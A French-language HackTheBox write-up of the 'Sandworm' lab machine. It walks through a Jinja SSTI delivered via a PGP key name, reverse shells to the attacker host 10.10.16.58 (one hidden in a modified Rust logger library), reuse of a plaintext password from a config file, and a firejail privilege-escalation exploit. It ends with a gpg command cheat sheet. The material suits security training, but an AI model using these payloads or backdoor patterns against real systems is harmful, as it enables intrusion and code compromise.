---
title:  "HacktheBox WriteUp : Sandworm"
category: HackTheBox
tag: writeups
---
### Skills
- Nmap
- gobuster
-

### Scanner le réseau

On scan le réseau 
```console
└─$ nmap 10.10.11.218                 
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
```

```console
└─$ nmap 10.10.11.218 -sC -sV -p 22,80,443
Starting Nmap 7.92 ( https://nmap.org ) at 2023-11-06 18:08 CET
Nmap scan report for 10.10.11.218
Host is up (0.089s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://ssa.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
|_http-title: Secret Spy Agency | Secret Security Service
| ssl-cert: Subject: commonName=SSA/organizationName=Secret Spy Agency/stateOrProvinceName=Classified/countryName=SA
| Not valid before: 2023-05-04T18:03:25
|_Not valid after:  2050-09-19T18:03:25
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

On ajoute le nom de domaine récupéré avec le scan nmap dans le `/etc/hosts`.
```console
$ echo "10.10.11.218 ssa.htb" | sudo tee -a /etc/hosts   
```

## Enumération web

On fait une énumération de l'arborescence instinctivement, avec l'option `-k` pour ignorer la vérification de certificat tls.
```console
$ gobuster dir -u https://ssa.htb --wordlist /usr/share/dirb/wordlists/common.txt -k
```
<img src="/assets/images/WriteUps/HackTheBox/Sandworm/gobuster.png" width="400px" height="150px" style="display: block; margin: 0 auto"/>

En regardant les différents endpoints, on découvre le endpoint `/guide` qui est intéréssant.

<img src="/assets/images/WriteUps/HackTheBox/Sandworm/guideEndpoint.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>

Sur cette page, on a accès à différents fonctionnalités
1. Déchiffrer un message en pgp
2. Chiffrer un message en pgp
3. Vérifier la signature d'un message signé en pgp

La troisième fonctionnalité est particulièrement intéressante puisqu'elle nous renvoie une information à l'écran, notamment le nom du propriétaire de la clé publique associé au message chiffré et son adresse mail.

<img src="/assets/images/WriteUps/HackTheBox/Sandworm/gpgVerifySignature.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>

On peut penser à ces 2 champs comme entrées pour des possibles injection.

Au vu de la technologie utilisée (Flask), nous allons essayer un SSTI. (avec le classique `{{7*7}}`).

On crée donc une clé publique avec un nom et mail contenant le pattern pour identifier les SSTI :

```console
$ gpg --gen-key

pub   rsa3072 2023-11-07 [SC] [expire : 2025-11-06]
      F112C02E66A5E269EB8268EA98C0428905C24DEA
uid          [  ultime ] {{7*7}} <{{7*7}}@gmail.com>
sub   rsa3072 2023-11-07 [E] [expire : 2025-11-06]
```

On signe le message et on l'affiche: 
```console
$ gpg --clearsign --local-user "{{7*7}}" tmp.txt
$ cat tmp.txt.asc
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Test
-----BEGIN PGP SIGNATURE-----

iQHGBAEBCgAwFiEE8RLALmal4mnrgmjqmMBCiQXCTeoFAmVKWyQSHHt7Nyo3fX1A
Z21haWwuY29tAAoJEJjAQokFwk3qNHsL/1PLa+/UVycvoKguqTqhnFFVGGbqkl9M
gjKJClOQ36G5a+wLFrUhtIiWtTgkUoqsSDOdn7L4NlFn79MmoGxW3vapYarbhvPy
kK0CLFGSg1yyWbuFu+r6CHyjaABttjVuFCFfk/AR0OTSD/JdGAg2s8q3g2AJsLoh
nbRgEm9kcxWXBH1udWiHYKE8kmMQzk5yxjjdIXmkzCY8rKBVFI/q5BK+nq+/YrhR
BC3IMGg2dk0CbJSIhqR5gtAJu2Uv3P31vGhBZFFj0CW0Dn9JP89Un8SYk2H8Jhnm
PZFy+9Ox34JYTXFvqyoWAXn3zd5DjsbogBUywj3DhxfzcekK8li7r4Rmwj6pmim9
Yn0WI6pkf6uZciUG7G0/pSbNTzzYw5eM3OZcK+gvEJBA7+4TVicT97BSWt391ZMF
Sx1kzmsjFEPy93gfdhdNVBCWmHF+jNXsi/yMyrtaHkUVAc9ZYUZa1qsMAM0c4j3n
b8+MO5k4KH9vYvhVGImLExsqOGRh78b6WQ==
=UIJU
-----END PGP SIGNATURE-----

```

On récupère notre clé publique :
```
$ gpg --export -a "{{7*7}}"
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQGNBGVKWkwBDADpp03TjmB3KJ1v6ssnvRG/
....
-----END PGP PUBLIC KEY BLOCK-----
```

On obtient le résultat suivant, ce qui avère la préscence d'un SSTI.
<img src="/assets/images/WriteUps/HackTheBox/Sandworm/SSTIProoved.png" width="600px" height="300px" style="display: block; margin: 0 auto"/>


### Acces Initial
Un paylaod utilisé pour les SSTI de **jinja** est :
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`

On crée une clé de la manière précédente, et le résultat est un succès :
<img src="/assets/images/WriteUps/HackTheBox/Sandworm/idSSTI.png" width="300px" height="400px" style="display: block; margin: 0 auto"/>

On va donc adapter cela avec un revershell vers notre machine attaquant :
`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/10.10.16.58/1234 0>&1').read() }}`

Lors de la création de la clé pgp, il n'est pas possible d'avoir les caractères `<>`, on va donc encoder en base64 notre payload.

```console
└─$ echo "bash -c 'bash -i >& /dev/tcp/10.10.16.58/4444 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OC80NDQ0IDA+JjEnCg==
```

<u>Payload Final (pour le Username de la clé publqiue)</u>

`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('echo "YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi41OC80NDQ0IDA+JjEnCg==" | base64 -d| bash').read() }}`

<u>Côté attaquant</u>
```
└─$ nc -nlvp 4444  
```

```console
└─$ nc -lvnp 4444
/usr/local/sbin/lesspipe: 1: dirname: not found
atlas@sandworm:/var/www/html/SSA$ cd /home
atlas@sandworm:/home$ id
    uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:/home$ ls
    atlas
    silentobserver
```
On est connecté en atlas, et on voit qu'il y a un autre utilisateur (silentobserver).

## Atlas &rarr; silentobserver
En regardant les fichers et dossiers dans le répertoire courant, on voit un dossier `.config`.

En parcourant ce dossier, on se retrouve à trouver un fichier `admin.json` contenant des credentials pour silentobserver, qui peuvent être testé en ssh.

```console
atlas@sandworm:~/.config/httpie/sessions/localhost_5000$ cat admin.json
cat admin.json
{
    "__meta__": {
        "about": "HTTPie session file",
        "help": "https://httpie.io/docs#sessions",
        "httpie": "2.6.0"
    },
    "auth": {
        "password": "quietLiketheWind22",
        "type": null,
        "username": "silentobserver"
    },
    "cookies": {
        "session": {
            "expires": null,
            "path": "/",
            "secure": false,
            "value": "eyJfZmxhc2hlcyI6W3siIHQiOlsibWVzc2FnZSIsIkludmFsaWQgY3JlZGVudGlhbHMuIl19XX0.Y-I86w.JbELpZIwyATpR58qg1MGJsd6FkA"
        }
    },
    "headers": {
        "Accept": "application/json, */*;q=0.5"
    }
}
```

On essaye de les utiliser en tant que credentials pour ssh et on obtient le flag user.

## Escalade de privilège

En lançant `pspy64` et la commande `ps aux`, on voit un processus non conventionnel 
```console
2023/11/07 17:25:23 CMD: UID=1000 PID=1202   | /usr/local/bin/firejail --profile=webapp flask run 
```

On voit que le binaire a une permission **SUID** :
```console
silentobserver@sandworm:/usr/local/bin$ ls -la
total 20992
drwxr-xr-x  2 root root      4096 Jun  6 11:49 .
drwxr-xr-x 11 root root      4096 Jun  6 11:49 ..
-rwxr-xr-x  1 root root    129896 Nov 29  2022 firecfg
-rwsr-x---  1 root jailer 1777952 Nov 29  2022 firejail
...
```
On remarque que le binaire firejail appartient au groupe `jailer` que nous n'appartenons pas :

```console
silentobserver@sandworm:/tmp$ id
uid=1001(silentobserver) gid=1001(silentobserver) groups=1001(silentobserver)
```

Cependant, l'utilisateur atlas y appartient lui :

```console
silentobserver@sandworm:/tmp$ cat /etc/group | grep jailer
jailer:x:1002:atlas
```


Cependant, en se connectant avec atlas, on voit que l'utilisateur n'est pas dans le groupe en question, et qu'il y a de nombreuses commandes qui ne sont pas disponible (wget par exemple)

```console
atlas@sandworm:~$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas)
atlas@sandworm:~$ wget
wget
Could not find command-not-found database. Run 'sudo apt update' to populate it.
```





On revient sur **silentobserver**, et on voit de nombreux fichiers dont nous avons les droits en écrite avec un dossier `.git`.


**Linpeas**
```console
[+] Interesting writable Files
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files                                      
/opt/crates/logger/.git
/opt/crates/logger/.git/config
/opt/crates/logger/.git/description
/opt/crates/logger/.git/HEAD
/opt/crates/logger/.git/info/exclude
/opt/crates/logger/.git/hooks/update.sample
/opt/crates/logger/.git/hooks/post-update.sample
/opt/crates/logger/.git/hooks/fsmonitor-watchman.sample
/opt/crates/logger/.git/hooks/pre-rebase.sample
/opt/crates/logger/.git/hooks/pre-merge-commit.sample
/opt/crates/logger/.git/hooks/pre-push.sample
/opt/crates/logger/.git/hooks/pre-commit.sample

```

**ps64**
```console
2023/11/07 17:26:11 CMD: UID=0    PID=11702  | /bin/rm -r /opt/crates 
2023/11/07 17:26:11 CMD: UID=0    PID=11701  | /bin/bash /root/Cleanup/clean_c.sh 
2023/11/07 17:26:11 CMD: UID=0    PID=11703  | 
2023/11/07 17:26:11 CMD: UID=0    PID=11704  | /bin/cp -rp /root/Cleanup/crates /opt/ 
2023/11/07 17:28:01 CMD: UID=0    PID=11714  | /bin/sudo -u atlas /usr/bin/cargo run --offline 
2023/11/07 17:28:01 CMD: UID=0    PID=11712  | /bin/sh -c cd /opt/tipnet && /bin/echo "e" | /bin/sudo -u atlas /usr/bin/cargo run --offline    
```

On voit que tipnet est exécuté en `sudo` en tant qu'utilisateur `atlas` avec le paramètre `"e"`.

On peut voir le code de `tipnet` :

```console
silentobserver@sandworm:/opt/tipnet/src$ cat main.rs 
extern crate logger;
use sha2::{Digest, Sha256};
use chrono::prelude::*;
use mysql::*;
use mysql::prelude::*;
use std::fs;
use std::process::Command;
use std::io;

// We don't spy on you... much.

struct Entry {
    timestamp: String,
    target: String,
    source: String,
    data: String,
}

fn main() {
    println!("                                                     
             ,,                                      
MMP\"\"MM\"\"YMM db          `7MN.   `7MF'         mm    
P'   MM   `7               MMN.    M           MM    
     MM    `7MM `7MMpdMAo. M YMb   M  .gP\"Ya mmMMmm  
     MM      MM   MM   `Wb M  `MN. M ,M'   Yb  MM    
     MM      MM   MM    M8 M   `MM.M 8M\"\"\"\"\"\"  MM    
     MM      MM   MM   ,AP M     YMM YM.    ,  MM    
   .JMML.  .JMML. MMbmmd'.JML.    YM  `Mbmmd'  `Mbmo 
                  MM                                 
                .JMML.                               

");


    let mode = get_mode();
    
    if mode == "" {
            return;
    }
    else if mode != "upstream" && mode != "pull" {
        println!("[-] Mode is still being ported to Rust; try again later.");
        return;
    }

    let mut conn = connect_to_db("Upstream").unwrap();


    if mode == "pull" {
        let source = "/var/www/html/SSA/SSA/submissions";
        pull_indeces(&mut conn, source);
        println!("[+] Pull complete.");
        return;
    }

    println!("Enter keywords to perform the query:");
    let mut keywords = String::new();
    io::stdin().read_line(&mut keywords).unwrap();

    if keywords.trim() == "" {
        println!("[-] No keywords selected.\n\n[-] Quitting...\n");
        return;
    }

    println!("Justification for the search:");
    let mut justification = String::new();
    io::stdin().read_line(&mut justification).unwrap();

    // Get Username 
    let output = Command::new("/usr/bin/whoami")
        .output()
        .expect("nobody");

    let username = String::from_utf8(output.stdout).unwrap();
    let username = username.trim();

    if justification.trim() == "" {
        println!("[-] No justification provided. TipNet is under 702 authority; queries don't need warrants, but need to be justified. This incident has been logged and will be reported.");
        logger::log(username, keywords.as_str().trim(), "Attempted to query TipNet without justification.");
        return;
    }

    logger::log(username, keywords.as_str().trim(), justification.as_str());

    search_sigint(&mut conn, keywords.as_str().trim());

}

fn get_mode() -> String {

        let valid = false;
        let mut mode = String::new();

        while ! valid {
                mode.clear();

                println!("Select mode of usage:");
                print!("a) Upstream \nb) Regular (WIP)\nc) Emperor (WIP)\nd) SQUARE (WIP)\ne) Refresh Indeces\n");

                io::stdin().read_line(&mut mode).unwrap();

                match mode.trim() {
                        "a" => {
                              println!("\n[+] Upstream selected");
                              return "upstream".to_string();
                        }
                        "b" => {
                              println!("\n[+] Muscular selected");
                              return "regular".to_string();
                        }
                        "c" => {
                              println!("\n[+] Tempora selected");
                              return "emperor".to_string();
                        }
                        "d" => {
                                println!("\n[+] PRISM selected");
                                return "square".to_string();
                        }
                        "e" => {
                                println!("\n[!] Refreshing indeces!");
                                return "pull".to_string();
                        }
                        "q" | "Q" => {
                                println!("\n[-] Quitting");
                                return "".to_string();
                        }
                        _ => {
                                println!("\n[!] Invalid mode: {}", mode);
                        }
                }
        }
        return mode;
}

fn connect_to_db(db: &str) -> Result<mysql::PooledConn> {
    let url = "mysql://tipnet:4The_Greater_GoodJ4A@localhost:3306/Upstream";
    let pool = Pool::new(url).unwrap();
    let mut conn = pool.get_conn().unwrap();
    return Ok(conn);
}

fn search_sigint(conn: &mut mysql::PooledConn, keywords: &str) {
    let keywords: Vec<&str> = keywords.split(" ").collect();
    let mut query = String::from("SELECT timestamp, target, source, data FROM SIGINT WHERE ");

    for (i, keyword) in keywords.iter().enumerate() {
        if i > 0 {
            query.push_str("OR ");
        }
        query.push_str(&format!("data LIKE '%{}%' ", keyword));
    }
    let selected_entries = conn.query_map(
        query,
        |(timestamp, target, source, data)| {
            Entry { timestamp, target, source, data }
        },
        ).expect("Query failed.");
    for e in selected_entries {
        println!("[{}] {} ===> {} | {}",
                 e.timestamp, e.source, e.target, e.data);
    }
}

fn pull_indeces(conn: &mut mysql::PooledConn, directory: &str) {
    let paths = fs::read_dir(directory)
        .unwrap()
        .filter_map(|entry| entry.ok())
        .filter(|entry| entry.path().extension().unwrap_or_default() == "txt")
        .map(|entry| entry.path());

    let stmt_select = conn.prep("SELECT hash FROM tip_submissions WHERE hash = :hash")
        .unwrap();
    let stmt_insert = conn.prep("INSERT INTO tip_submissions (timestamp, data, hash) VALUES (:timestamp, :data, :hash)")
        .unwrap();

    let now = Utc::now();

    for path in paths {
        let contents = fs::read_to_string(path).unwrap();
        let hash = Sha256::digest(contents.as_bytes());
        let hash_hex = hex::encode(hash);

        let existing_entry: Option<String> = conn.exec_first(&stmt_select, params! { "hash" => &hash_hex }).unwrap();
        if existing_entry.is_none() {
            let date = now.format("%Y-%m-%d").to_string();
            println!("[+] {}\n", contents);
            conn.exec_drop(&stmt_insert, params! {
                "timestamp" => date,
                "data" => contents,
                "hash" => &hash_hex,
                },
                ).unwrap();
        }
    }
    logger::log("ROUTINE", " - ", "Pulling fresh submissions into database.");

}
```

Grossièrement, l'appel avec ces paramètres va provoquer l'exécution de la fonction `pull_indeces`.
Cette fonction appellera la fonction log dans le logger.

L'utilisateur `Silentobserver` a des autorisations d'écriture sur le répertoire du logger et peut modifier le code source de le logger.

On va ajouter un reverseshell dans le code du logger, recompiler, attendre que l'atlas soit exécuté et exécuter à nouveau le shell utilisateur de l'atlas avec tipnet.

Trouvez le shell inversé en langage rust : https://github.com/LukeDSchenk/rust-backdoors/blob/master/reverse-shell/src/main.rs

On l'écrit dans le code source et on compile.

Le code (`/opt/crates/logger/src/lib.rs`)est le suivant :


```console
silentobserver@sandworm:/opt/crates/logger/src$ cat lib.rs 
extern crate chrono;

use std::fs::OpenOptions;
use std::io::Write;
use chrono::prelude::*;
use std::process::Command;

pub fn log(user: &str, query: &str, justification: &str) {
    let command = "bash -i >& /dev/tcp/10.10.16.58/5555 0>&1";
    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output()
        .expect("not work");

    let now = Local::now();
    let timestamp = now.format("%Y-%m-%d %H:%M:%S").to_string();
    let log_message = format!("[{}] - User: {}, Query: {}, Justification: {}\n", timestamp, user, query, justification);

    let mut file = match OpenOptions::new().append(true).create(true).open("/opt/tipnet/access.log") {
        Ok(file) => file,
        Err(e) => {
            println!("Error opening log file: {}", e);
            return;
        }
    };

    if let Err(e) = file.write_all(log_message.as_bytes()) {
        println!("Error writing to log file: {}", e);
    }
}
```

On a du auparavant l'écrire sur notre machine et le transférer par manque de droit d'écriture sur silenceobserver.
On compile ensuite :
```console
silentobserver@sandworm:/opt/crates/logger/src$ cargo build
   Compiling autocfg v1.1.0
   Compiling libc v0.2.142
   Compiling num-traits v0.2.15
   Compiling num-integer v0.1.45
   Compiling time v0.1.45
   Compiling iana-time-zone v0.1.56
   Compiling chrono v0.4.24
   Compiling logger v0.1.0 (/opt/crates/logger)
warning: unused variable: `output`
  --> src/lib.rs:10:9
   |
10 |     let output = Command::new("bash")
   |         ^^^^^^ help: if this is intentional, prefix it with an underscore: `_output`
   |
   = note: `#[warn(unused_variables)]` on by default

warning: `logger` (lib) generated 1 warning
    Finished dev [unoptimized + debuginfo] target(s) in 8.67s

```

Du côté attaquant, on obtient un shell dans le groupe "jailer"

```console
─$ nc -lvnp 5555        
listening on [any] 5555 ...

atlas@sandworm:/opt/tipnet$ id
id
uid=1000(atlas) gid=1000(atlas) groups=1000(atlas),1002(jailer)
```

Maintenant qu'on est dans le groupe `jailer`, on récupère l'exploit de 
`firejail` obtenu [ici](https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw/86058ce12f69997b2de35c5de7bcd3036654f32f/exploit.py).

On l'exécute sur la session de `atlas` :
```console
atlas@sandworm:/tmp$ python3 exploit.py
You can now run 'firejail --join=74800' in another terminal to obtain a shell where 'sudo su -' should grant you a root shell.
```

On ouvre une autre session de la même manière que précédemment pour un `atlas`, et on exécute la commande `firejail --join=74800`.
On peut ainsi obtenir le flag root :

<img src="/assets/images/WriteUps/HackTheBox/Sandworm/rootflag.png" width="300px" height="150px" style="display: block; margin: 0 auto"/>

## Ref

- [Compréhension gpg](https://www.linuxtricks.fr/wiki/gpg-chiffrer-et-dechiffrer-des-fichiers-avec-un-mot-de-passe)
- [Utilisation gpg](https://www.digitalocean.com/community/tutorials/how-to-use-gpg-to-encrypt-and-sign-messages)
- [payload SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [Firejail POC](https://gist.githubusercontent.com/GugSaas/9fb3e59b3226e8073b3f8692859f8d25/raw/86058ce12f69997b2de35c5de7bcd3036654f32f/exploit.py)
- [reverse shell in rust](https://gist.github.com/GugSaas/512fc84ef1d5aefec4c38c2448935b01)


## Utilisation de gpg:

> Les clés, messages chiffrés/déchiffrés sont toujours de la forme :
-----BEGIN PGP MESSAGE-----
myMessage
-----END PGP MESSAGE-----
Il faut laisser les headers et footer dans les fichiers pour la suite des commandes.

Il y a plusieurs versions de gpg, pour la version actuelle que j'utilise (2.2.35), le stockage des clés est fait de la manière suivante :
- Les ficheirs/dossiers sur les clés gpg par défaut sont contenues dans le dossier `~/.gnupg/`
- les **clés privées** sont contenues dans le dossier `private-keys-v1.d`
- les **clés publiques** sont dans le fichier `pubring.kbx`


### Générer une clé publique :
```console
gpg --gen-key 
ou 
gpg --quick-gen-key "MyQuickKey"
```

### Lister les clés
```console
$ gpg --list-keys
pub   rsa3072 2023-11-07 [SC] [expire : 2025-11-06]
      F221631811C83C377616C96C1E6600A2ADF5B318
uid          [  ultime ] MyQuickKey
sub   rsa3072 2023-11-07 [E]
```

### Exporter une clé publique
```console
$ gpg --export -a F221631811C83C377616C96C1E6600A2ADF5B318 | sudo tee -a "quickKey.key"
ou
$ gpg --armor --export "MyQuickKey" | sponge secondPubKey.asc

```

### Dechiffrer un message chiffré avec sa propre clé privée 
```console
$ gpg --decrypt -o message-dechiffre.txt fichier-chiffre.txt
```

### Importer la clé publique d'autrui
```console
$ gpg --import someoneKey.txt 
```

### Utiliser une clé publique pour chiffrer un message
```console
$ gpg --encrypt --recipient "recipientName" -o cryptedMsg.txt -a -e uncryptedMsg.txt
```

- "recipientName" à remplacer par le nom/email du destinataire présent dans sa clé.
- -a : génére une sortie en texte ASCII.
- -e : effectue le chiffrement.

### Signer un message avec une clé publique

```console
$ gpg --clearsign --local-user "mailRecipient@gmail.com" fileMsg.txt
```